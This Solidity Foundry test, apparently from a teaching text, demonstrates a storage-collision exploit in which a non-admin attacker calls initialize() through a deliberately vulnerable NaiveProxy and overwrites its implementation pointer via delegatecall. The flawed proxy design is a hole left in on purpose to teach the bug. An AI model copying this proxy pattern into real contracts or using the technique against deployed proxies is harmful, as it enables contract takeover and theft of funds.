// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {NaiveProxy, LogicV1} from "../../src/ch02/NaiveProxy.sol";

/// @notice Demonstrates the storage-collision takeover of NaiveProxy. This test
///         is an *exploit* — it passes by successfully corrupting the proxy,
///         which proves the bug is real. A non-admin caller invokes an ordinary
///         logic function and, as a side effect, overwrites the proxy's
///         implementation pointer.
///
/// @dev This is the class of bug agents produce constantly: each contract is
///      individually correct, but nobody reasoned about the *shared* storage
///      that `delegatecall` forces them to share. Chapter 2's lesson is that you
///      must hold the execution context in your head; the compiler will not warn
///      you.
contract ProxyCollisionTest is Test {
    NaiveProxy internal proxy;
    LogicV1 internal logic;

    address internal deployer = address(this);
    address internal attacker = address(0xA11CE);

    function setUp() public {
        logic = new LogicV1();
        proxy = new NaiveProxy(address(logic));
    }

    function test_baseline_pointerIsLogic() public {
        assertEq(proxy.implementation(), address(logic), "fresh proxy points at logic");
        assertEq(proxy.admin(), deployer, "admin is the deployer");
    }

    /// The exploit: `initialize` writes to slot 0 in the *proxy's* storage,
    /// which is the proxy's `implementation` pointer. A non-admin attacker can
    /// therefore repoint the proxy at will — a full takeover through a function
    /// that was never meant to touch proxy state.
    function test_exploit_initializeOverwritesImplementation() public {
        // Slot 0 in LogicV1 is `owner`; slot 0 in the proxy is `implementation`.
        // delegatecall runs LogicV1's code against the proxy's storage.
        address hijackTarget = address(0xBADBAD);

        vm.prank(attacker);
        LogicV1(payable(address(proxy))).initialize(hijackTarget);

        // The proxy's implementation pointer has been silently rewritten by a
        // caller who is not the admin and never called upgradeTo.
        assertEq(
            proxy.implementation(),
            hijackTarget,
            "COLLISION: initialize() overwrote the proxy implementation pointer"
        );

        // Read the raw slot too, so the mechanism is unambiguous.
        bytes32 slot0 = vm.load(address(proxy), bytes32(uint256(0)));
        assertEq(address(uint160(uint256(slot0))), hijackTarget, "raw slot 0 confirms the overwrite");
    }
}
